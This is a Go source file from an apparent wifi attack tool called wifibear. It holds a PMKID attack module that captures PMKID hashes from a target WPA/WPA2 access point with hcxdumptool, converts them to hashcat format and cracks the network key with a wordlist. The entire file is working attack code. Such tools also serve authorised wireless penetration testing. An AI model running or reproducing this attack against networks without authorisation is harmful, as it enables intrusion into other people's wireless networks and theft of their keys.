package attack

import (
	"context"
	"fmt"
	"os"
	"time"

	"github.com/wifibear/wifibear/internal/config"
	"github.com/wifibear/wifibear/internal/result"
	"github.com/wifibear/wifibear/internal/tools"
	"github.com/wifibear/wifibear/pkg/wifi"
)

// PMKIDAttack captures and cracks PMKID hashes without client interaction.
type PMKIDAttack struct {
	cfg        *config.Config
	hcxdump    *tools.HcxDumpTool
	hcxpcap    *tools.HcxPcapTool
	hashcat    *tools.Hashcat
}

func NewPMKIDAttack(cfg *config.Config) *PMKIDAttack {
	return &PMKIDAttack{
		cfg:     cfg,
		hcxdump: tools.NewHcxDumpTool(),
		hcxpcap: tools.NewHcxPcapTool(),
		hashcat: tools.NewHashcat(),
	}
}

func (p *PMKIDAttack) Name() string {
	return "PMKID Capture"
}

func (p *PMKIDAttack) Priority() int {
	return 10 // Highest priority for WPA targets (fast, no client needed)
}

func (p *PMKIDAttack) CanAttack(target *wifi.Target) bool {
	if p.cfg.Attack.NoPMKID || p.cfg.Attack.WPSOnly || p.cfg.Attack.WEPOnly {
		return false
	}
	if !p.hcxdump.Available() {
		return false
	}
	return target.Encryption == wifi.EncWPA2 || target.Encryption == wifi.EncWPA
}

func (p *PMKIDAttack) Run(ctx context.Context, target *wifi.Target, iface string) (*result.CrackResult, error) {
	bssid := target.BSSID.String()
	timeout := p.cfg.Attack.PMKID.Timeout

	// Create temp files for capture
	pcapFile, err := os.CreateTemp("", "wifibear-pmkid-*.pcapng")
	if err != nil {
		return nil, fmt.Errorf("create temp file: %w", err)
	}
	pcapPath := pcapFile.Name()
	pcapFile.Close()
	defer os.Remove(pcapPath)

	// Run hcxdumptool with timeout
	captureCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	err = p.hcxdump.CapturePMKID(captureCtx, iface, bssid, pcapPath)
	// hcxdumptool always "errors" when context expires; check if we got output
	if err != nil && captureCtx.Err() == nil {
		return nil, fmt.Errorf("PMKID capture failed: %w", err)
	}

	// Check if capture file has data
	info, err := os.Stat(pcapPath)
	if err != nil || info.Size() == 0 {
		return nil, fmt.Errorf("no PMKID captured (AP may not be vulnerable)")
	}

	// Convert to hashcat format
	if !p.hcxpcap.Available() {
		return nil, fmt.Errorf("hcxpcaptool not available for conversion")
	}

	hashFile, err := os.CreateTemp("", "wifibear-hash-*.22000")
	if err != nil {
		return nil, fmt.Errorf("create hash file: %w", err)
	}
	hashPath := hashFile.Name()
	hashFile.Close()
	defer os.Remove(hashPath)

	if err := p.hcxpcap.ConvertToHashcat(ctx, pcapPath, hashPath); err != nil {
		return nil, fmt.Errorf("convert PMKID: %w", err)
	}

	// Attempt to crack
	if !p.hashcat.Available() {
		return &result.CrackResult{
			BSSID:      bssid,
			ESSID:      target.ESSID,
			Encryption: target.Encryption.String(),
			AttackType: "PMKID",
			Timestamp:  time.Now(),
		}, fmt.Errorf("PMKID hash saved, but hashcat not available for cracking")
	}

	wordlist := p.cfg.Wordlist
	if wordlist == "" {
		return nil, fmt.Errorf("no wordlist specified")
	}

	key, err := p.hashcat.CrackPMKID(ctx, hashPath, wordlist)
	if err != nil {
		return nil, fmt.Errorf("PMKID crack failed: %w", err)
	}

	return &result.CrackResult{
		BSSID:      bssid,
		ESSID:      target.ESSID,
		Key:        key,
		Encryption: target.Encryption.String(),
		AttackType: "PMKID",
		Timestamp:  time.Now(),
	}, nil
}
